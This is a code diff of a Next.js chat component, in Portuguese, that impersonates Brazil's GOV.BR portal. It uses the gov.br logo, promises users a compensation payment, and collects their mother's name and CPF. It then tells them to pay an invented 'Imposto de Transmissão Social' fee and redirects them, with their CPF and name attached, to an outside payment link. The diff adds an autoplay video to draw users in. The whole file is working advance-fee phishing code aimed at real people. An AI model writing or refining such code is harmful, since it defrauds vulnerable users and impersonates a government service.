@@ -1,9 +1,16 @@
 
 "use client";
 
-import React, { useState, useEffect, useRef } from 'react';
-import { useRouter } from 'next/navigation'; // Added import
-import { Loader2 } from 'lucide-react';
+import React, { useState, useEffect, useRef, useMemo } from 'react';
+import { useRouter } from 'next/navigation';
+import { Loader2, VolumeX } from 'lucide-react';
+import dynamic from 'next/dynamic';
+import type PlyrInstance from 'plyr';
+import 'plyr-react/plyr.css';
+
+const Plyr = dynamic(() => import('plyr-react'), {
+  ssr: false,
+});
 
 export interface SimulatedChatParams {
   gclid?: string;
@@ -25,36 +32,47 @@ interface Message {
   isTyping?: boolean;
 }
 
-interface SimulatedChatFlowProps {
-  initialParams: SimulatedChatParams;
+interface FlowStepDetails {
+  botMessage?: string | ((params: SimulatedChatParams) => string);
+  options?: 
+    | { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]
+    | ((params: SimulatedChatParams) => { text: string; value: string; nextStep?: keyof typeof flowDefinition }[]);
+  nextStepAfterVideo?: keyof typeof flowDefinition; // For video step
+  isRedirectStep?: boolean; // For payment redirect
 }
 
-const flowDefinition = {
+interface FlowDefinition {
+  [key: string]: FlowStepDetails;
+}
+
+
+const flowDefinition: FlowDefinition = {
+  intro_video: {
+    botMessage: "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
+    nextStepAfterVideo: 'start',
+  },
   start: {
     botMessage: (params: SimulatedChatParams) => `Olá ${params.nome || 'usuário'}! Para começarmos, por favor, confirme o nome da sua mãe:`,
     options: (params: SimulatedChatParams) => [
       { text: params.mae || "Nome da Mãe (Não informado)", value: 'confirm_mae', nextStep: 'ask_question_1' },
-      { text: "Informar outro nome", value: 'other_mae', nextStep: 'ask_mae_again' }, // Placeholder
+      { text: "Informar outro nome", value: 'other_mae', nextStep: 'ask_mae_again' },
     ],
   },
-  ask_mae_again: { // Placeholder if 'other_mae' is chosen
+  ask_mae_again: { 
     botMessage: "Por favor, digite o nome completo da sua mãe.",
-    // This would ideally be a text input, but for simplicity with buttons:
-    // For now, let's assume this path is not fully implemented in this button-based simulation.
-    // Or we can simulate it with a button that just moves on.
     options: [{text: "Ok, entendi (simulação)", value: 'mae_understood', nextStep: 'ask_question_1'}]
   },
   ask_question_1: {
     botMessage: "Você possui alguma pendência financeira registrada no SERASA ou SPC?",
     options: [
       { text: "Sim", value: 'pendencia_sim', nextStep: 'ask_marital_status' },
-      { text: "Não", value: 'pendencia_nao', nextStep: 'ask_marital_status' }, // User script clicks "Não"
+      { text: "Não", value: 'pendencia_nao', nextStep: 'ask_marital_status' },
     ],
   },
   ask_marital_status: {
     botMessage: "Qual seu estado civil?",
     options: [
-      { text: "Solteiro (a)", value: 'solteiro', nextStep: 'ask_payment_method' }, // User script clicks "Solteiro (a)"
+      { text: "Solteiro (a)", value: 'solteiro', nextStep: 'ask_payment_method' },
       { text: "Casado (a)", value: 'casado', nextStep: 'ask_payment_method' },
       { text: "Divorciado (a)", value: 'divorciado', nextStep: 'ask_payment_method' },
       { text: "Viúvo (a)", value: 'viuvo', nextStep: 'ask_payment_method' },
@@ -64,11 +82,11 @@ const flowDefinition = {
     botMessage: "Para a liberação do seu benefício, será necessário o pagamento de uma taxa única referente ao Imposto de Transmissão Social (ITS). Como deseja prosseguir?",
     options: [
       { text: "Pagar com Cartão de Crédito", value: 'cartao', nextStep: 'confirm_cpf' },
-      { text: "Pagar com PIX (via CPF)", value: 'pix_cpf', nextStep: 'confirm_cpf' }, // User script clicks "CPF" (assuming it means PIX CPF)
+      { text: "Pagar com PIX (via CPF)", value: 'pix_cpf', nextStep: 'confirm_cpf' },
       { text: "Saber mais sobre a taxa", value: 'info_taxa', nextStep: 'explain_tax_briefly' },
     ],
   },
-  explain_tax_briefly: { // Added step based on user script later clicking "Porque tenho que pagar esse imposto?"
+  explain_tax_briefly: { 
     botMessage: "A taxa de Imposto de Transmissão Social (ITS) é um valor simbólico obrigatório para cobrir custos operacionais e garantir a segurança da transação e a liberação do seu benefício. O pagamento é processado de forma segura pela plataforma GOV.BR.",
     options: [
         { text: "Entendi, desejo pagar com PIX (CPF)", value: 'pix_cpf_after_explain', nextStep: 'confirm_cpf'},
@@ -79,56 +97,73 @@ const flowDefinition = {
   confirm_cpf: {
     botMessage: (params: SimulatedChatParams) => `Seu CPF para o pagamento da taxa e recebimento do benefício é: ${params.cpf || 'Não informado'}. Está correto?`,
     options: (params: SimulatedChatParams) => [
-      { text: "Sim, está correto.", value: 'cpf_correto', nextStep: 'ask_receipt' }, // User script clicks "Sim, está correto."
-      { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' }, // Placeholder
+      { text: "Sim, está correto.", value: 'cpf_correto', nextStep: 'ask_receipt' },
+      { text: "Não, desejo alterar.", value: 'cpf_incorreto', nextStep: 'handle_cpf_correction' },
     ],
   },
-  handle_cpf_correction: { // Placeholder
+  handle_cpf_correction: { 
     botMessage: "Entendido. Para corrigir seu CPF, por favor, reinicie o processo ou entre em contato com o suporte.",
     options: [{ text: "Ok", value: 'cpf_correction_ack', nextStep: 'end_chat_early' }]
   },
   ask_receipt: {
     botMessage: "Excelente! Após a confirmação do pagamento da taxa, o valor do benefício será liberado. Você deseja receber o comprovante de recebimento do benefício em seu e-mail cadastrado no GOV.BR?",
     options: [
-      { text: "Sim, desejo receber meu comprovante.", value: 'receipt_yes', nextStep: 'final_info_before_payment' }, // User script clicks this
+      { text: "Sim, desejo receber meu comprovante.", value: 'receipt_yes', nextStep: 'final_info_before_payment' },
       { text: "Não, obrigado.", value: 'receipt_no', nextStep: 'final_info_before_payment' },
     ],
   },
   final_info_before_payment: {
     botMessage: "Perfeito. Você está a um passo de receber sua indenização. A taxa ITS garante a liberação imediata após a confirmação.",
     options: [
-      { text: "Concluir pagamento e receber minha indenização", value: 'proceed_to_payment', nextStep: 'redirect_to_payment' }, // User script clicks this
-      { text: "Porque tenho que pagar esse imposto?", value: 'ask_why_tax_again', nextStep: 'explain_tax_detailed' }, // User script clicks this
+      { text: "Concluir pagamento e receber minha indenização", value: 'proceed_to_payment', nextStep: 'redirect_to_payment' },
+      { text: "Porque tenho que pagar esse imposto?", value: 'ask_why_tax_again', nextStep: 'explain_tax_detailed' },
     ],
   },
   explain_tax_detailed: {
     botMessage: "O Imposto de Transmissão Social (ITS) é uma contribuição única e obrigatória, estabelecida para cobrir despesas administrativas e de processamento seguro da sua indenização através da plataforma GOV.BR. Este valor garante a conformidade legal e a agilidade na liberação dos seus fundos. Após o pagamento, o valor integral da indenização é disponibilizado imediatamente.",
     options: [
       { text: "Entendi. Concluir pagamento e receber indenização.", value: 'proceed_to_payment_after_detail', nextStep: 'redirect_to_payment' },
-      { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' }, // Placeholder
+      { text: "Ainda tenho dúvidas.", value: 'more_doubts', nextStep: 'support_contact' },
     ],
   },
-  support_contact: { // Placeholder
+  support_contact: { 
     botMessage: "Para mais informações, por favor, acesse a seção de Ajuda no portal GOV.BR ou entre em contato com nosso suporte.",
     options: [{ text: "Ok", value: 'support_ack', nextStep: 'end_chat_early' }]
   },
   redirect_to_payment: {
-    // This step will trigger a redirect, no message or options needed from bot.
-    // Logic handled in handleOptionClick
+    isRedirectStep: true,
   },
   end_chat_early: {
     botMessage: "Obrigado por utilizar nossos serviços. Sessão encerrada."
-    // No options, chat ends.
   }
 };
 
 
-const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) => {
+const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
-  const [currentStep, setCurrentStep] = useState<keyof typeof flowDefinition>('start');
+  const [currentStep, setCurrentStep] = useState<keyof typeof flowDefinition>('intro_video');
   const [isBotTyping, setIsBotTyping] = useState(true);
   const chatEndRef = useRef<HTMLDivElement>(null);
-  const router = useRouter(); // Assuming useRouter is available if needed for programmatic navigation outside payment redirect
+  const router = useRouter();
+
+  const playerRef = useRef<PlyrInstance | null>(null);
+  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
+  const videoUrl = "https://225412.b-cdn.net/Video%20Page.mp4";
+
+  const plyrSource = useMemo(() => ({
+    type: 'video' as const,
+    sources: [{ src: videoUrl, provider: 'html5' as const }],
+  }), [videoUrl]);
+
+  const plyrOptions = useMemo(() => ({
+    controls: [],
+    hideControls: true,
+    clickToPlay: false,
+    autoplay: true,
+    muted: true,
+    playsinline: true,
+  }), []);
+
 
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -138,7 +173,19 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
     const stepConfig = flowDefinition[currentStep];
     if (!stepConfig) return;
 
+    if (currentStep === 'redirect_to_payment') {
+      handleRedirectToPayment();
+      return;
+    }
+    
     setIsBotTyping(true);
+    // Clear previous messages only if it's not the intro video step coming from itself (e.g. after video click)
+    // or if it's the very first message of intro_video
+    if (currentStep !== 'intro_video' || (currentStep === 'intro_video' && messages.length === 0)) {
+        // This logic might need refinement if we want to keep the intro video message always visible before chat starts
+    }
+
+
     setTimeout(() => {
       let botText = "";
       if (typeof stepConfig.botMessage === 'function') {
@@ -158,17 +205,17 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
          }
       }
       
-      if (botText || botMsg.options) { // Only add message if there's text or options
-        setMessages(prev => [...prev, botMsg]);
+      if (botText || botMsg.options || currentStep === 'intro_video') {
+        // For intro_video, add message even if only video is shown (text is separate)
+         if (currentStep === 'intro_video' && messages.find(m => m.text === stepConfig.botMessage)) {
+            // Message already added, do nothing more for text part
+        } else if (botText || botMsg.options) {
+             setMessages(prev => [...prev, botMsg]);
+        }
       }
       setIsBotTyping(false);
 
-      // Handle automatic redirection if the step is 'redirect_to_payment'
-      if (currentStep === 'redirect_to_payment') {
-        handleRedirectToPayment();
-      }
-
-    }, 1000); // Simulate bot typing delay
+    }, 1000); 
 
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [currentStep, initialParams]);
@@ -177,31 +224,27 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
   const handleRedirectToPayment = () => {
     const basePaymentUrl = "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN";
     const queryParams = new URLSearchParams();
-    if (initialParams.cpf) queryParams.set('document', initialParams.cpf.replace(/\D/g, '')); // Ensure only numbers for document
+    if (initialParams.cpf) queryParams.set('document', initialParams.cpf.replace(/\D/g, ''));
     if (initialParams.nome) queryParams.set('name', initialParams.nome);
     if (initialParams.utm_campaign) queryParams.set('utm_campaign', initialParams.utm_campaign);
     if (initialParams.utm_content) queryParams.set('utm_content', initialParams.utm_content);
     if (initialParams.utm_medium) queryParams.set('utm_medium', initialParams.utm_medium);
     if (initialParams.utm_source) queryParams.set('utm_source', initialParams.utm_source);
-    // utm_term is empty in the example, so not adding if not present or empty
     
     const finalUrl = `${basePaymentUrl}?${queryParams.toString()}`;
-    console.log("Redirecting to payment URL:", finalUrl);
     window.location.href = finalUrl;
   };
 
-
-  const handleOptionClick = (optionValue: string, nextStep?: keyof typeof flowDefinition) => {
+  const handleOptionClick = (optionValue: string, nextStepKey?: keyof typeof flowDefinition) => {
     const userMessageId = `user-${Date.now()}`;
-    // Find the text of the clicked option to display as user message
     const currentStepConfig = flowDefinition[currentStep];
-    let userMessageText = optionValue; // Fallback to value if text not found
+    let userMessageText = optionValue; 
 
-    if (currentStepConfig) {
+    if (currentStepConfig?.options) {
         let currentOptions: { text: string; value: string; nextStep?: keyof typeof flowDefinition }[] = [];
         if (typeof currentStepConfig.options === 'function') {
             currentOptions = currentStepConfig.options(initialParams);
-        } else if (currentStepConfig.options) {
+        } else {
             currentOptions = currentStepConfig.options;
         }
         const clickedOption = currentOptions.find(opt => opt.value === optionValue);
@@ -212,60 +255,109 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
 
     setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: userMessageText }]);
 
-    if (nextStep) {
-      setCurrentStep(nextStep);
-    } else if (optionValue === 'proceed_to_payment' || optionValue === 'proceed_to_payment_after_detail') {
-      // This is handled by the useEffect detecting currentStep === 'redirect_to_payment'
-      // but also can be triggered directly if needed, though the flow structure assumes useEffect handles it.
-      // For safety, we ensure the state is set so useEffect will pick it up.
-      if(currentStep !== 'redirect_to_payment') {
-        setCurrentStep('redirect_to_payment');
-      } else {
-        // If already in redirect_to_payment state, and somehow this is clicked again, force redirect.
-        handleRedirectToPayment();
+    if (nextStepKey) {
+      setCurrentStep(nextStepKey);
+    } else {
+      // Fallback or error if no next step defined
+    }
+  };
+  
+  const handleVideoThumbnailClick = async () => {
+    if (playerRef.current?.plyr) {
+      try {
+        playerRef.current.plyr.muted = false; 
+        await playerRef.current.plyr.play(); 
+        setShowVideoThumbnailOverlay(false);
+        
+        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
+        if (nextStep) {
+          // Add the intro message if not already present (or re-add if cleared)
+          const introMsgText = flowDefinition.intro_video.botMessage as string;
+          if (!messages.find(m => m.text === introMsgText && m.sender === 'bot')) {
+            const msgId = `bot-intro-${Date.now()}`;
+            setMessages(prev => [...prev, {id: msgId, sender: 'bot', text: introMsgText }]);
+          }
+          // Transition to the chat flow after a short delay to let user see video start
+          setTimeout(() => {
+            setCurrentStep(nextStep);
+          }, 500);
+        }
+      } catch (error) {
+        console.error("Error trying to play/unmute video:", error);
+        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
+        if (nextStep) setCurrentStep(nextStep); // Proceed even if video fails
       }
     } else {
-      console.warn("No next step defined for option:", optionValue);
-      // Optionally, lead to an end_chat_early or a "Sorry, I didn't understand" step.
+        const nextStep = flowDefinition.intro_video.nextStepAfterVideo;
+        if (nextStep) setCurrentStep(nextStep); // Proceed if player not ready
     }
   };
 
+
   return (
     <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px' }}>
-      {messages.map((msg) => (
-        <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
-          {msg.sender === 'bot' && (
-            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
-          )}
-          <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
-            {msg.text}
-            {msg.sender === 'bot' && msg.options && !isBotTyping && (
-              <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
-                {msg.options.map(opt => (
-                  <button
-                    key={opt.value}
-                    onClick={() => handleOptionClick(opt.value, opt.nextStep)}
-                    className="chat-option-button"
-                  >
-                    {opt.text}
-                  </button>
-                ))}
+      {currentStep === 'intro_video' && (
+        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
+           <p style={{ textAlign: 'center', marginBottom: '10px', fontSize: '16px', color: '#333' }}>
+            {typeof flowDefinition.intro_video.botMessage === 'string' ? flowDefinition.intro_video.botMessage : ''}
+          </p>
+          <div className="video-player-wrapper" style={{ position: 'relative', maxWidth: '100%', width:'auto', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden' }}>
+            <Plyr
+              ref={playerRef}
+              source={plyrSource}
+              options={plyrOptions}
+            />
+            {showVideoThumbnailOverlay && (
+              <div
+                onClick={handleVideoThumbnailClick}
+                style={{
+                  position: 'absolute',
+                  top: 0, left: 0, right: 0, bottom: 0,
+                  background: 'rgba(0,0,0,0.5)',
+                  display: 'flex',
+                  flexDirection: 'column',
+                  justifyContent: 'center',
+                  alignItems: 'center',
+                  cursor: 'pointer',
+                  color: 'white',
+                  zIndex: 10
+                }}
+              >
+                <VolumeX size={48} />
+                <span style={{ marginTop: '10px', fontSize: '18px' }}>Clique para Ouvir</span>
               </div>
             )}
           </div>
         </div>
-      ))}
-      {isBotTyping && messages.length > 0 && messages[messages.length -1].sender === 'user' && (
-         <div className="message-container bot-message-container">
-            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
-            <div className="message bot-message typing-indicator">
-                <span className="dot"></span>
-                <span className="dot"></span>
-                <span className="dot"></span>
-            </div>
-        </div>
       )}
-       {isBotTyping && messages.length === 0 && ( // Typing indicator for the very first message
+
+      {messages.map((msg) => (
+        // Render only non-intro_video messages here if intro_video has its own section
+        (currentStep !== 'intro_video' || msg.text !== flowDefinition.intro_video.botMessage) && (
+          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
+            {msg.sender === 'bot' && (
+              <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
+            )}
+            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
+              {msg.text}
+              {msg.sender === 'bot' && msg.options && !isBotTyping && currentStep !== 'intro_video' && (
+                <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                  {msg.options.map(opt => (
+                    <button
+                      key={opt.value}
+                      onClick={() => handleOptionClick(opt.value, opt.nextStep)}
+                      className="chat-option-button"
+                    >
+                      {opt.text}
+                    </button>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+        )
+      ))}
+      {isBotTyping && (currentStep !== 'intro_video' || messages.length === 0) && (
          <div className="message-container bot-message-container">
             <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
             <div className="message bot-message typing-indicator">
@@ -287,16 +379,16 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
         }
         .user-message-container {
           align-self: flex-end;
-          flex-direction: row-reverse; /* Makes user messages appear on the right */
+          flex-direction: row-reverse; 
         }
         .bot-avatar {
           width: 32px;
           height: 32px;
           border-radius: 50%;
           margin-right: 8px;
-          margin-top: 4px; /* Align with top of message bubble */
+          margin-top: 4px; 
         }
-        .user-message-container .bot-avatar { /* User doesn't have an avatar in this example */
+        .user-message-container .bot-avatar { 
           display: none;
         }
         .message {
@@ -307,25 +399,25 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
           word-wrap: break-word;
         }
         .bot-message {
-          background-color: #f1f0f0; /* Light grey for bot */
+          background-color: #f1f0f0; 
           color: #000;
           border-top-left-radius: 4px;
         }
         .user-message {
-          background-color: #007bff; /* Blue for user */
+          background-color: #007bff; 
           color: white;
           border-top-right-radius: 4px;
-          margin-right: 0; /* Remove margin if avatar is not on this side */
+          margin-right: 0; 
         }
         .user-message-container .user-message {
-            margin-left: auto; /* Pushes bubble to the right */
+            margin-left: auto; 
         }
 
         .options-container {
           margin-top: 10px;
           display: flex;
-          flex-direction: column; /* Stack buttons vertically */
-          align-items: flex-start; /* Align buttons to the start of the container */
+          flex-direction: column; 
+          align-items: flex-start; 
           gap: 8px;
         }
         .chat-option-button {
@@ -338,8 +430,8 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
           font-size: 14px;
           transition: background-color 0.2s, color 0.2s;
           text-align: left;
-          width: auto; /* Fit content */
-          display: inline-block; /* Fit content */
+          width: auto; 
+          display: inline-block; 
         }
         .chat-option-button:hover {
           background-color: #007bff;
@@ -348,13 +440,13 @@ const SimulatedChatFlow: React.FC<SimulatedChatFlowProps> = ({ initialParams }) 
         .typing-indicator {
             display: inline-flex;
             align-items: center;
-            padding: 10px 15px; /* Match message padding */
+            padding: 10px 15px; 
         }
         .typing-indicator .dot {
             width: 8px;
             height: 8px;
             margin: 0 2px;
-            background-color: #aaa; /* Grey dots */
+            background-color: #aaa; 
             border-radius: 50%;
             animation: bounce 1.4s infinite;
         }
